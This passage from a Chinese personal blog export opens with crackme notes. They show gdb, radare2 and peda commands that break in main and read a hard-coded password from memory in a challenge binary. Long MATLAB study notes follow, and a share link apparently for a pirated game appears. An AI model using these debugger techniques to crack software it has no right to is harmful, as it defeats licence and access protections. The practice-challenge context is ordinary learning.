<h3 id="破解方法1"><a href="#破解方法1" class="headerlink" title="破解方法1"></a>破解方法1</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">$ gdb ./ch25.bin </span><br><span class="line">(gdb) <span class="built_in">set</span> args toto <span class="comment">//设置输入参数toto</span></span><br><span class="line">(gdb) b main <span class="comment">//在main设置断点</span></span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x8048a95</span> </span><br><span class="line">(gdb) r  <span class="comment">//运行程序（到断点）</span></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0x08048a95</span> <span class="function">in <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="params">(gdb)</span>disass <span class="comment">//显示汇编代码</span></span></span><br><span class="line">(gdb) b *main+268</span><br><span class="line">gdb)c 继续执行</span><br><span class="line">(gdb) layout prev 可以查看堆栈和汇编代码</span><br><span class="line">(gdb) x/<span class="number">1</span>xw $eax</span><br><span class="line">“ x / <span class="number">1</span>xw $ eax命令在EAX寄存器中包含的地址处显示<span class="number">1</span>个十六进制格式的<span class="number">16</span>位字</span><br><span class="line">(gdb) x/<span class="number">1</span>s <span class="number">0X08050b24</span></span><br><span class="line">查看该地址值</span><br></pre></td></tr></table></figure>

<h3 id="破解方法2"><a href="#破解方法2" class="headerlink" title="破解方法2"></a>破解方法2</h3><p><code>radare2 </code> 类似IDA</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">r2 ch25.bin</span><br><span class="line">aaa <span class="comment">//分析函数，参数...</span></span><br><span class="line">VV @main <span class="comment">//使用 VV 进入 图形化模式（需要是函数范围内）。</span></span><br><span class="line">pdf @ main <span class="comment">//分析后就可以正常打印函数代码了（pdf 打印函数代码）</span></span><br></pre></td></tr></table></figure>
<p>peda是GDB的一个插件<br><a href="https://github.com/longld/peda">https://github.com/longld/peda</a></p>
<p>gdb-peda$ run jlkd 带参数运行</p>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>essay1</title>
    <url>/2020/02/19/essay1/</url>
    <content><![CDATA[<p>matlab可以</p>
<p>psnr()  RGB图像直接来<br><img src="https://s2.ax1x.com/2020/02/19/3EM7nK.png" alt="3EM7nK.png"><br><img src="https://s2.ax1x.com/2020/02/19/3EMLAe.png" alt="3EMLAe.png"></p>
<p>Normalized  Cross  Correlation<br>normxcorr2 matlab计算方法不同<br><img src="https://s2.ax1x.com/2020/02/19/3EMXhd.png" alt="3EMXhd.png"><br>The  value  is  generally 0–1. However, ideally it should be 1 but the value 0.7 is acceptable.</p>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab_haar1</title>
    <url>/2020/02/11/matlab_haar1/</url>
    <content><![CDATA[<pre><code>waveletfamilies(&#39;a&#39;)
waveletfamilies(&#39;f&#39;)
waveinfo(&#39;db&#39;)</code></pre>
<p> use wfilters, wavefun, and wpfun to obtain the filters, wavelet, or wavelet packets </p>
<a id="more"></a>
<hr>
<p>linspace<br><code>Generate linearly spaced vectorcollapse all in page</code><br>Syntax<br>y = linspace(x1,x2)<br>y = linspace(x1,x2,n)</p>
<hr>
<p>小波的含义，即为时间上衰减快，和傅里叶的正弦波相比要短。<br>在频率域上，通过拉伸或压缩小波的长度，来改变小波的长短和频率，实现不同频率下的小波系数。<br>小波中，一般用尺度scale来衡量小波的频率f，两者之间的转换关系为：<br>scale∗f=Fs∗wcfscale * f=Fs * wcf<br>scale∗f=Fs∗wcf<br>公式中，Fs代表信号的采样频率，wcf为小波的中心频率（wave central freq），在matlab里可以用 centfrq(wavename) 来查询。<br> 噪点 高频信号</p>
<hr>
<p>imagesc<br>Display image with scaled colors</p>
<hr>
<p>尺度函数又称为小波父函数<br>phi 希腊文</p>
<hr>
<p><code>haart2（x，level)</code><br>If level is greater than 1, then h, v, and d are cell arrays. If level is equal to 1, then h, v, and d are matrices.<br>2-D Haar wavelet transform</p>
<hr>
<p><code>ihaart2</code><br>Inverse 2-D Haar wavelet transform</p>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab_haar2</title>
    <url>/2020/02/12/matlab_haar2/</url>
    <content><![CDATA[<p><code>imbinarize</code><br>Binarize 2-D grayscale image or 3-D volume by thresholding</p>
<hr>
<a id="more"></a>

<p>64:1<br>ans =<br>  空的 1×0 double 行向量<br><del>我人傻了</del><br><code>注意文件所在文件夹</code><br><del>这两个问题弄了我一下午</del></p>
<hr>
<p>图形的函数 fliplr 可以从左往右地翻转矩阵</p>
<hr>
<p>我觉得我懂炒股了<br><a href="http://player.bilibili.com/player.html?aid=68967083&cid=119544791&page=1">https://player.bilibili.com/player.html?aid=68967083&amp;cid=119544791&amp;page=1</a></p>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab_haar3</title>
    <url>/2020/02/18/matlab_haar3/</url>
    <content><![CDATA[<p>RGB  三个二维数组分别表示R,G,B<br>即，如果imshow的参数类型为double ，那么参数的取值范围只有在[0 1]才会正常显示。当值大于1时，都显示白色。这与matlab的传统是一致的， 对于灰度图像，uint8表示范围是[0 255] ,double表示范围是[0 1]</p>
<a id="more"></a>
<p>isequal()</p>
<p>塞尔达荒野之息Onedrive</p>
<pre><code>https://imhuanggh-my.sharepoint.com/:f:/g/personal/bin_imhuanggh_onmicrosoft_com/EhOlmQivpRBLh3BLkqxyDLYBW0JDW1V7i8lixd1T1Df-4g</code></pre>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab图像示例笔记1</title>
    <url>/2020/02/06/matlab%E5%9B%BE%E5%83%8F%E7%A4%BA%E4%BE%8B%E7%AC%94%E8%AE%B01/</url>
    <content><![CDATA[<h3 id="对比度"><a href="#对比度" class="headerlink" title="对比度"></a>对比度</h3><p>histogram  直方图<br>Precede the call to <code>imhist </code>with the <code>figure </code>command so that the histogram does not overwrite the display of the image I in the current figure window.</p>
<p>To see the distribution of intensities in the image, <code>create a histogram by calling the imhist</code> function.<br>输入图片，图片要求为灰度图或者二值图 imhist</p>
<a id="more"></a>
<pre><code>F=imread(&#39;test.jpg&#39;);
I=rgb2gray(F);
[count,x]=imhist(I，30)</code></pre>
<p><del>% 获取直方图的横坐标和纵坐标，即各个像素级，以及每个像素级上的像素出现的次数<br>figure;</del></p>
<pre><code>subplot(221);imhist(I,2);
subplot(222);imhist(I,5);
subplot(223);imhist(I,10);
subplot(224);imhist(I);

figure;
subplot(121); imhist(I,10)
[count,x] = imhist(I,10)
subplot(122);stem(x,count);</code></pre>
<blockquote>
<p>stem<br>绘制离散序列数据</p>
</blockquote>
<p><code>Improve the contrast </code>in an image, using the <code>histeq function</code>. The toolbox includes several other functions that perform contrast adjustment, including <code>imadjust</code> and <code>adapthisteq</code>, and interactive tools such as the Adjust Contrast tool, available in the Image Viewer<br>adjust the contrast </p>
<blockquote>
<p>灰度直方图均衡化histeq</p>
</blockquote>
<hr>
<h3 id="Correct-Nonuniform-Background-Illumination-and-Analyze-Foreground-Objects"><a href="#Correct-Nonuniform-Background-Illumination-and-Analyze-Foreground-Objects" class="headerlink" title="Correct Nonuniform Background Illumination and Analyze Foreground Objects"></a>Correct Nonuniform Background Illumination and Analyze Foreground Objects</h3><p>nonuniform</p>
<blockquote>
<p>strel（）<br>Morphological structuring element</p>
</blockquote>
<p><code>J = imopen(I,SE) </code>performs morphological opening on the grayscale or binary image I, returning the opened image, J. SE is a single structuring element object returned by the <code>strel or offsetstrel functions</code>. The morphological open operation is an erosion followed by a dilation, using the same structuring element for both operations.</p>
<p>surf<br>曲面图全页折叠<br>语法<br>surf(X,Y,Z)<br>surf(X,Y,Z,C)</p>
<p><code>f1=imadjust（f，[low_in  high_in],[low_out  high_out],gamma）</code><br>该函数的意义如图1所示，把图像f 灰度变换到新图像f1的过程中，f 中灰度值<code>低于low_in</code>的像素点在f1中灰度值被赋值为<code>low_out</code>,同理，f中灰度值<code>高于high_in</code>的像素点变换到f1时其灰度值也被赋值为<code>high_out</code>;</p>
<blockquote>
<p>J=imadjust(I,[0.2 0.5],[0 1])<br>原图像灰度范围为0-255，程序将小于255×0.2的灰度值设置为0，将大于255×0.5的灰度值设置为255</p>
</blockquote>
<p>饱和度取决于该色中含色成分和消色成分（灰色）的比例<br>比度指的是一幅图像中明暗区域最亮的白和最暗的黑之间不同亮度层级的测量，差异范围越大代表对比越大</p>
<p>Use the<code> imbinarize function</code> to convert the grayscale image into a<code> binary image</code></p>
<p><code>Remove background noise</code> from the image with the<code> bwareaopen function</code>.</p>
<p>F = false(sz1,…,szN) 是由逻辑值“0”组成的 sz1×…×szN 数组，其中 sz1,…,szN 表示每个维度的大小。例如，false(2,3) 返回由逻辑值“0”组成的 2×3 数组。</p>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab图像示例笔记2</title>
    <url>/2020/02/07/matlab%E5%9B%BE%E5%83%8F%E7%A4%BA%E4%BE%8B%E7%AC%94%E8%AE%B02/</url>
    <content><![CDATA[<h4 id="dicom-（a-image-type-using-in-medical"><a href="#dicom-（a-image-type-using-in-medical" class="headerlink" title="dicom （a image type using in medical)"></a>dicom （a image type using in medical)</h4><p>To read <code>metadata </code>from a DICOM file, use the <code>dicominfo function</code></p>
<hr>
<p>To read<code>image data</code>from a DICOM file, use the <code>dicomread function.</code></p>
<a id="more"></a>
<hr>
<p>If you just want to view the <code>metadata in a DICOM file</code>, for debugging purposes, you can use the<code> dicomdisp function.</code></p>
<hr>
<p>use one of the toolbox image display functions <code>imshow or imtool.</code></p>
<hr>
<p>the image data in this DICOM file is signed <code>16-bit data</code>, you must use the autoscaling syntax with either display function to make the image viewable.<br><code>imshow(I,&#39;DisplayRange&#39;,[])</code></p>
<hr>
<p>use the <code>dicomanon function</code>. Remove Confidential Information</p>
<hr>
<p>To write image data or metadata to a file in DICOM format, use the <code>dicomwrite function</code>.</p>
<hr>
<h4 id="Create-New-DICOM-Series"><a href="#Create-New-DICOM-Series" class="headerlink" title="Create New DICOM Series"></a>Create New DICOM Series</h4><pre><code>info.SeriesInstanceUID</code></pre>
<p>Generate a new DICOM unique identifier (UID) using the <code>dicomuid function.</code></p>
<pre><code>uid = dicomuid
info.SeriesInstanceUID = uid;
dicomwrite(Imodified,&#39;ankle_newseries.dcm&#39;,info);</code></pre>
<hr>
<p>The example finds the maximum and minimum values of all pixels in the image. The pixels that form the white <code>text characters </code>are<code> set to the maximum pixel value</code>. </p>
<hr>
<p>MATLAB command prompt: Enter dicomBrowser.</p>
<hr>
<p><a href="https://ww2.mathworks.cn/help/releases/R2018a/images/image-type-conversions.html" title="Image Type Conversion">Image Type Conversion</a></p>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab图像示例笔记3</title>
    <url>/2020/02/10/matlab%E5%9B%BE%E5%83%8F%E7%A4%BA%E4%BE%8B%E7%AC%94%E8%AE%B03/</url>
    <content><![CDATA[<p><code>mat2gray</code> 将dicom变为grey<br><code>im2uint8</code></p>
<hr>
<a id="more"></a>

<p> The image on the right has higher contrast, <code>with intensity values that fill the entire intensity range [0, 255].</code></p>
<hr>
<p><del>如果指定空矩阵 ([])，则 imshow 使用 [min(I(:)) max(I(:))]。换言之，使用 I 中的最小值作为黑色，使用最大值作为白色。</del></p>
<hr>
<p>imadjust<br>You must specify the intensities as values between 0 and 1 regardless of the class of I. If I is uint8, the values you supply are multiplied by 255 to determine the actual values to use; if I is uint16, the values are multiplied by 65535. </p>
<hr>
<p>figure<code>, </code>imshow(pout_histeq)<code>;</code><br>title(‘Histeq’);</p>
<hr>
<p>ROI<br>Create a Binary Mask<br>You can use the createMask function of the imroi base class to create a binary mask for any type of ROI object — impoint, imline, imrect, imellipse, impoly, or imfreehand. </p>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab笔记1</title>
    <url>/2020/01/30/matlab%E7%AC%94%E8%AE%B01/</url>
    <content><![CDATA[<p><code>a = [1 2 3 4]</code><br>创建矩阵的另一种方法是使用 ones、zeros 或 rand 等函数。例如，创建一个由零组成的 5×1 列向量。<br><code>z = zeros(5,1)</code></p>
<hr>
<p>MATLAB 允许您使用单一的算术运算符或函数来处理矩阵中的所有值。<br><code>a + 10</code></p>
<hr>
<a id="more"></a>

<p>要转置矩阵，请使用单引号 (‘)</p>
<hr>
<p>format 命令可以显示更多小数位数：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">format long</span><br><span class="line">p = a<span class="emphasis">*inv(a)</span></span><br><span class="line"><span class="emphasis">format short</span></span><br></pre></td></tr></table></figure>
<p>format 仅影响数字显示，而不影响 MATLAB 对数字的计算或保存方式。</p>
<hr>
<p>要执行元素级乘法（而非矩阵乘法），请使用 .* 运算符：<br><code>p = a.*a</code><br>乘法、除法和幂的矩阵运算符分别具有执行元素级运算的对应数组运算符。例如，计算 a 的各个元素的三次方：<br><code>a.^3</code></p>
<hr>
<p>串联是连接数组以便形成更大数组的过程。实际上，第一个数组是通过将其各个元素串联起来而构成的。成对的方括号 [] 即为串联运算符。<br><code>A = [a,a]</code></p>
<hr>
<p>使用逗号将彼此相邻的数组串联起来称为水平串联。每个数组必须具有相同的行数。同样，如果各数组具有相同的列数，则可以使用分号垂直串联。<br><code>A = [a; a]</code></p>
<hr>
<p>要表示复数的虚部，请使用 i 或 j。</p>
<pre><code>c = [3+4i, 4+3j; -i, 10j]
c = 2×2 complex</code></pre>
<hr>
<p><code>clc</code></p>
<hr>
<blockquote>
<p>每个变量都是一个可包含许多数字的数组</p>
</blockquote>
<hr>
<p>引用数组中的特定元素有两种方法。最常见的方法是指定行和列下标，例如<br><code>A(4,2)</code><br>另一种方法不太常用，但有时非常有用，即使用单一下标按顺序向下遍历每一列：<br><code>A(8)</code><br>可以在赋值语句左侧指定当前维外部的元素。数组大小会增大以便容纳新元素。<br><code>A(4,5) = 17</code></p>
<hr>
<p>要引用多个数组元素，请使用冒号运算符，这使您可以指定一个格式为<code>start:end</code>的范围。例如，列出 A 前三行及第二列中的元素：<br><code>A(1:3,2)</code><br>单独的冒号（没有起始值或结束值）指定该维中的所有元素。例如，选择 A 第三行中的所有列：<br><code>A(3,:)</code></p>
<hr>
<p>冒号运算符还允许您使用较通用的格式<code>start: step :end</code>创建等距向量值。如果省略中间的步骤（如 <code>start:end</code> 中），MATLAB 会使用默认步长值 1。<br><code>B = 0:10:100</code></p>
<hr>
<p>退出 MATLAB 后，工作区变量不会保留。使用<code>save</code>命令保存数据以供将来使用，<br><code>save myfile.mat</code><br>要清除工作区中的所有变量，请使用<code>clear</code>命令。<br>使用 load 将 MAT 文件中的数据还原到工作区。<br><code>load myfile.mat</code></p>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab笔记2</title>
    <url>/2020/02/01/matlab%E7%AC%94%E8%AE%B02/</url>
    <content><![CDATA[<p>处理文本时，将字符序列括在单引号中。可以将文本赋给变量。<br><code>myText = &#39;Hello, world&#39;;</code><br>如果文本包含单引号，使用两个单引号。</p>
<pre><code>otherText = &#39;You&#39;&#39;re right&#39;
otherText = 
&#39;You&#39;re right&#39;</code></pre>
<hr>
<a id="more"></a>

<p><code>whos</code>查询已有变量</p>
<hr>
<p>可以使用方括号串联字符数组，就像串联数值数组一样。<br><code>longText = [myText,&#39; - &#39;,otherText]</code></p>
<p>要将数值转换为字符，使用 num2str 或 int2str 等函数。</p>
<pre><code>f = 71;
c = (f-32)/1.8;
tempText = [&#39;Temperature is &#39;,num2str(c),&#39;C&#39;]</code></pre>
<hr>
<p>调用函数，例如 max，请将其输入参数括在圆括号中，存在多个输入参数，请使用逗号加以分隔，存在多个输出参数，请将其括在方括号中：</p>
<pre><code>[maxA,location] = max(A)
maxA = 5
location = 3</code></pre>
<hr>
<p>任何字符输入括在单引号中：<br><code>disp(&#39;hello world&#39;)</code></p>
<hr>
<p>创建二维线图，请使用 plot（绘制） 函数。</p>
<pre><code>x = 0:pi/100:2*pi; 创建矩阵的一种方法
y = sin(x);
plot(x,y）</code></pre>
<p>标记轴并添加标题。</p>
<pre><code>xlabel(&#39;x&#39;)
ylabel(&#39;sin(x)&#39;)
title(&#39;Plot of the Sine Function&#39;)</code></pre>
<p>向 plot 函数添加第三个输入参数，您可以使用红色虚线绘制相同的变量。<br><code>plot(x,y,&#39;r--&#39;)</code><br>‘r–’ 为线条设定。每个设定可包含表示线条颜色、样式和标记的字符。标记是在绘制的每个数据点上显示的符号，例如，+、o 或 <em>。例如，’g:</em>‘ 请求绘制使用 * 标记的绿色点线。</p>
<p>将绘图添加到现有图窗中，请使用 hold on。在使用 hold off 或关闭窗口之前，当前图窗窗口中会显示所有绘图</p>
<pre><code>hold on
y2 = cos(x);
plot(x,y2,&#39;:&#39;)
legend(&#39;sin&#39;,&#39;cos&#39;) legend就是添加图例的标注
比如：legend(&#39;First&#39;,&#39;Second&#39;,-1)，表示字符串依次注释plot中的图，后面板的参数（此处是-1）表示注释的位置。
hold off</code></pre>
<hr>
<p>三维图通常显示一个由带两个变量的函数（即 z = f (x,y)）定义的曲面图。</p>
<p><code>[X,Y] = meshgrid(-2:.2:2); </code> STEP=0.2  meshgrid函数生成的X，Y是大小相等的矩阵</p>
<p>surf 函数及其伴随函数 mesh 以三维形式显示曲面图。surf 使用颜色显示曲面图的连接线和面。mesh 生成仅以颜色标记连接定义点的线条的线框曲面图。</p>
<hr>
<p>使用 subplot 函数可以在同一窗口的不同子区域显示多个绘图。<br>subplot 的前两个输入表示每行和每列中的绘图数。第三个输入指定绘图是否处于活动状态。</p>
<hr>
<blockquote>
<p>键入脚本名称即可运行该脚本。脚本是最简单的一种 MATLAB® 程序。脚本是一个包含多行连续 MATLAB 命令和函数调用的扩展名为<code>.m</code>的文件。在命令行中<em>键入脚本名称</em>即可运行该脚本。<br>要创建脚本，请使用 edit 命令。<br><code>edit plotrand</code><br>使用百分比 (%) 符号添加注释</p>
</blockquote>
<hr>
<pre><code>nsamples = 5;
npoints = 50;
for k = 1:nsamples
    currentData = rand(npoints,1);
    sampleMean(k) = mean(currentData);
end
overallMean = mean(sampleMean)

if overallMean &lt; .49
   disp(&#39;Mean is less than expected&#39;)
elseif overallMean &gt; .51
   disp(&#39;Mean is greater than expected&#39;)
else
   disp(&#39;Mean is within the expected range&#39;)
end</code></pre>
<hr>
<p>使用 doc 命令在单独的窗口中打开函数文档。<br><code>doc mean</code><br>在键入函数输入参数的左括号之后暂停，此时命令行窗口中会显示相应函数的提示<br>使用 help 命令可在命令行窗口中查看相应函数的简明文档。</p>
<hr>
<p>使用空格或逗号分隔行的元素。<br>使用分号 ; 表示每行末尾。<br>使用方括号 [ ] 将整个元素列表括起来。</p>
<p>sum(A) 计算列<br>sum(A’)’<br>避免双重转置的其他方法，请在 sum 函数中使用维度参数：<br><code>sum(A,2)</code></p>
<p><code>diag(A)</code> 获取对角线值</p>
<hr>
<p>图形的函数 fliplr 可以从左往右地翻转矩阵：<br><code>sum(diag(fliplr(A)))</code></p>
<hr>
<p>magic 函数创建几乎任意大小的幻方矩阵。行列对角线相加都相同<br>四个用于生成基本矩阵的函数。<br>zeros<br>全部为零<br>ones<br>全部为 1<br>rand<br>均匀分布的随机元素<br>randn<br>正态分布的随机元素</p>
<hr>
<p>MATLAB 不需要任何类型声明或维度说明。当 MATLAB 遇到新的变量名称时，它会自动创建变量，并分配适当大小的存储。如果此变量已存在，MATLAB 会更改其内容，并根据需要分配新存储。</p>
<p>MATLAB 仅使用名称的前 N 个字符（其中 N 是函数 namelengthmax 返回的数字） 为63</p>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab笔记3</title>
    <url>/2020/02/02/matlab%E7%AC%94%E8%AE%B03/</url>
    <content><![CDATA[<p>科学记数法使用字母 e 来指定 10 次方的缩放因子<br>浮点数的有限精度约为 16 位有效小数位数，有限范围约为 10-308 至 10+308。双精度格式表示的数字的最大精度为 52 位。整数的可用精度为 8 位、16 位、32 位和 64 位</p>
<pre><code>x = uint64(36028797018963968);
y = uint64(36028797018963972);</code></pre>
<a id="more"></a>
<hr>
<p>例如，sort 函数根据量值进行排序，如果量值相等，则根据相位角度排序。</p>
<pre><code>sort([3+4i, 4+3i])  量值都为5
ans =
   4.0000 + 3.0000i   3.0000 + 4.0000i
angle(3+4i)
ans =
    0.9273</code></pre>
<p>“等于”关系运算符 == 要求实部和虚部相等。其他二进制关系运算符 &gt;、&lt;、&gt;= 和 &lt;= 忽略数字的虚部，而仅考虑实部。</p>
<hr>
<p>数组运算对构建表非常有用。假定 n 为列向量<br><code>n = (0:9)&#39;;</code><br>然后，<br><code>pows = [n  n.^2  2.^n]</code><br>构建一个平方和 2 次幂的表：</p>
<pre><code>pows =
     0     0     1
     1     1     2
     2     4     4
     3     9     8
     4    16    16
     5    25    32
     6    36    64
     7    49   128
     8    64   256
     9    81   512</code></pre>
<hr>
<pre><code>format short g
x = (1:0.1:2)&#39;;
logs = [x log10(x)]</code></pre>
<p>构建一个对数表。</p>
<pre><code> logs =
      1.0            0 
      1.1      0.04139
      1.2      0.07918
      1.3      0.11394
      1.4      0.14613
      1.5      0.17609
      1.6      0.20412
      1.7      0.23045
      1.8      0.25527
      1.9      0.27875
      2.0      0.30103</code></pre>
<hr>
<p>有关初等数学函数的列表，请键入<br>help elfun<br>有关更多高等数学函数和矩阵函数的列表，请键入<br>help specfun<br>help elmat</p>
<hr>
<p>format 函数控制所显示的值的数值格式。</p>
<pre><code>x = [4/3 1.2345e-6]

format short

   1.3333    0.0000

format short e

   1.3333e+000  1.2345e-006

format short g

   1.3333  1.2345e-006

format long

   1.33333333333333   0.00000123450000

format long e

   1.333333333333333e+000    1.234500000000000e-006

format long g

   1.33333333333333               1.2345e-006

format bank

   1.33          0.00

format rat

   4/3          1/810045

format hex

   3ff5555555555555   3eb4b6231abfd271</code></pre>
<p>语句无法容纳在一行中，请使用省略号（三个句点）**…**</p>
<p>要进一步控制输出格式，请使用 sprintf 和 fprintf 函数。</p>
<hr>
<pre><code>100:-7:50
sum(A(1:4,4))
sum(A(:,end)) end 引用最后一个行或列</code></pre>
<p>为什么 4×4 幻方矩阵的幻数和等于 34？如果将介于 1 到 16 之间的整数分为四个总和相等的组，该总和必须为<br>sum(1:16)/4<br>当然，也即<br>ans =<br>     34</p>
<p><code>B = [A  A+32; A+48  A+16]</code></p>
<hr>
<p>要删除 X 的第二列，请使用<br><code>X(:,2) = []</code></p>
<p><code>X( 2 : 2 : 10) = [] </code> 按列数第几个<br>生成<br><code>X =     16     9     2     7    13    12     1</code></p>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab笔记4</title>
    <url>/2020/02/03/matlab%E7%AC%94%E8%AE%B04/</url>
    <content><![CDATA[<pre><code>B = A - 8.5
B(1:2,2:3) = 0
x = [2.1 1.7 1.6 1.5 NaN 1.9 1.8 1.5 5.1 1.8 1.4 2.2 1.6 1.8];
x = x(isfinite(x))
x =
  2.1 1.7 1.6 1.5 1.9 1.8 1.5 5.1 1.8 1.4 2.2 1.6 1.8
x = x(abs(x-mean(x)) &lt;= 3*std(x))
x =
  2.1 1.7 1.6 1.5 1.9 1.8 1.5 1.8 1.4 2.2 1.6 1.8</code></pre>
<a id="more"></a>
<hr>
<p>find 函数可用于确定与指定逻辑条件相符的数组元素的索引。find 以最简单的形式返回索引的列向量。转置该向量以便获取索引的行向量。</p>
<pre><code>k = find(isprime(A))&#39;
k =
     2     5     9    10    11    13</code></pre>
<p><code>R = randn(3,4,5);</code></p>
<hr>
<p>MATLAB 中的元胞数组是以其他数组的副本为元素的多维数组<br><code>C = &#123;A sum(A) prod(prod(A))&#125;</code><br>。第一，要检索某个元胞的内容，请在花括号中使用下标。例如，C{1} 检索幻方矩阵，C{3} 为 16!。第二，<strong>元胞数组包含其他数组的副本，而不包含指向这些数组的指针</strong>。</p>
<pre><code>M = cell(8,1); 元胞数组
for n = 1:8
   M&#123;n&#125; = magic(n);
end
M</code></pre>
<hr>
<p><code>v = [s; &#39;world&#39;]</code><br>垂直联接字符并生成</p>
<pre><code>v =
   Hello
   world</code></pre>
<p>char 函数可执行这种填充操作。例如，<br><code>S = char(&#39;A&#39;,&#39;rolling&#39;,&#39;stone&#39;,&#39;gathers&#39;,&#39;momentum.&#39;)</code></p>
<p>也可以将文本存储在元胞数组中。例如，</p>
<p><code>C = &#123;&#39;A&#39;;&#39;rolling&#39;;&#39;stone&#39;;&#39;gathers&#39;;&#39;momentum.&#39;&#125;</code></p>
<p>可以将填充后的字符数组转换为字符向量元胞数组：<br><code>C = cellstr(S)</code><br>使用以下语句可以逆转此过程<br><code>S = char(C)</code></p>
<hr>
<p>结构体是多维 MATLAB 数组，包含可按文本字段标志符访问的元素。例如，</p>
<pre><code>S.name = &#39;Ed Plum&#39;;
S.score = 83;
S.grade = &#39;B+&#39;

S = 
     name: &#39;Ed Plum&#39;
    score: 83
    grade: &#39;B+&#39;</code></pre>
<p>可以一次添加一个字段，</p>
<pre><code>S(2).name = &#39;Toni Miller&#39;;
S(2).score = 91;
S(2).grade = &#39;A-&#39;;</code></pre>
<p>可以使用一个语句添加整个元素：</p>
<pre><code>S(3) = struct(&#39;name&#39;,&#39;Jerry Garcia&#39;,... 
               &#39;score&#39;,70,&#39;grade&#39;,&#39;C&#39;)</code></pre>
<p>键入<br><code>S.score</code><br>与键入<br><code>S(1).score, S(2).score, S(3).score</code><br>相同，这是一个逗号分隔列表。</p>
<pre><code>scores = [S.score]
names = char(S.name)
names = &#123;S.name&#125;
[N1 N2 N3] = S.name</code></pre>
<p>访问结构体数据的另一种方法是使用动态字段名称。这些名称将字段表示为变量表达式，MATLAB 会在运行时计算这些表达式。此处显示的点-括号语法将 expression 作为动态字段名称：<br><code>structName.(expression)</code><br>例如，要在字段名称中计算 expression，并在行 7 中的 1 至 25 列内获取该字段的值，请使用<br><code>structName.(expression)(7,1:25)</code></p>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>matlab笔记5 image</title>
    <url>/2020/02/05/matlab%E7%AC%94%E8%AE%B05/</url>
    <content><![CDATA[<p>使用基于帕斯卡三角形的项创建一个对称矩阵：<br><code>A = pascal(3)</code></p>
<p>randi 的第一个输入描述整数可能值的范围，后面两个输入描述行和列的数量。<br><code>C = randi(10,3,2)</code></p>
<p>有一个专门的点积函数，称为 <code>dot</code>。</p>
<a id="more"></a>
<p>非共轭复数转置（其中每个元素的复数部分保留其符号）表示为<code> z.&#39;</code></p>
<p><code>eye(m,n)</code><br>返回 m×n 矩形单位矩阵，eye(n) 返回 n×n 单位方阵。</p>
<p>向量 x 的 p-范数，<br><code>norm(x,p)</code> 进行计算，此运算是为 p &gt; 1 的任意值定义的，但最常见的 p 值为 1、2 和 ∞。默认值为 p = 2，</p>
<p><code>x = b/A</code><br>表示使用 mrdivide 获得的矩阵方程 xA = b 的解。<br><code>x = A\b</code><br>表示使用 mldivide 获得的矩阵方程 Ax = b 的解。</p>
<p><code>(b/A)&#39; = (A&#39;\b&#39;)</code>.<br>m = n<br>方阵方程组。求精确解。<br>m &gt; n<br>超定方程组，即方程个数多于未知数个数。求最小二乘解。<br>m &lt; n<br>欠定方程组，即方程个数少于未知数个数。使用最多 m 个非零分量求基本解。</p>
<p><em>非奇异矩阵==可逆矩阵</em></p>
<p><code>eig</code><br>特征值和特征向量</p>
<p>提供的数据分析函数的列表，请键入<br><code>help datafun</code></p>
<hr>
<h1 id="图像"><a href="#图像" class="headerlink" title="图像"></a>图像</h1><p>要显示图像，请使用 imshow 函数：<br><code>imshow(X,map)</code><br>使用<code> imread</code> 函数可以读取标准图像文件（TIFF、JPEG、PNG 等）。imread 返回的数据类型取决于读取的图像类型。<br>使用<code> imwrite</code> 函数可以将 MATLAB 数据写入到各种标准图像格式。<br>大多数图像表示为二维数组（矩阵），其中矩阵的每个元素对应所显示图像的一个像素。例如，由 200 行和 300 列不同颜色的点组成的图像保存为一个 200×300 的矩阵。有些图像，如 RGB，需要三维数组，其中三个维度的第一个平面表示红色像素强度，第二个平面表示绿色像素强度，第三个平面表示蓝色像素强度。<br>MATLAB 数学支持三种不同的数值类用于图像显示：<br>双精度浮点数（double）<br>16 位无符号整数（uint16）<br>8 位无符号整数（uint8）</p>
<pre><code>imshow    显示图像
image    从数组显示图像
imagesc    显示使用经过标度映射的颜色的图像
imread    从图形文件读取图像
imresize    调整图像大小
imwrite    将图像写入图形文件
imfinfo    有关图形文件的信息
imformats    管理图像文件格式注册表
frame2im    返回与影片帧关联的图像数据
im2frame    将图像转换为影片帧
im2java    将图像转换 Java 图像
im2double    将图像转换为双精度值
ind2rgb    将索引图像转换为 RGB 图像
rgb2gray    将 RGB 图像或颜色图转换为灰度图
rgb2ind    将 RGB 图像转换为索引图像
imapprox    通过减少颜色数量来近似处理索引图像
dither    转换图像，通过抖动提高表观颜色分辨率
cmpermute    重新排列颜色图中的颜色
cmunique    消除颜色图中的重复颜色；将灰度或真彩色图像转换为索引图像</code></pre>
<p><code>A = imread(&#39;ngc6543a.jpg&#39;);</code></p>
<hr>
